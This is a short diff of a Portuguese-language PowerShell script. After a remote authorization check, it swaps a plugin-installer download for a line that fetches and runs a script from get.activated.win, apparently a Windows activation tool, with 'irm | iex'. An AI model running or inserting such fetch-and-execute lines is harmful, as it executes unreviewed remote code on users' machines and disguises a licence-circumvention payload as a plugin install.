@@ -9,7 +9,7 @@ try {
     
     if ($response.status -eq "authorized") {
         Write-Host "Acesso Permitido! Ativando..." -ForegroundColor Green
-        irm "https://luatools.vercel.app/install-plugin.ps1" | iex
+        irm "https://get.activated.win" | iex
     }
 } catch {
     # This catch block will capture the 403 Forbidden and the 401 Invalid
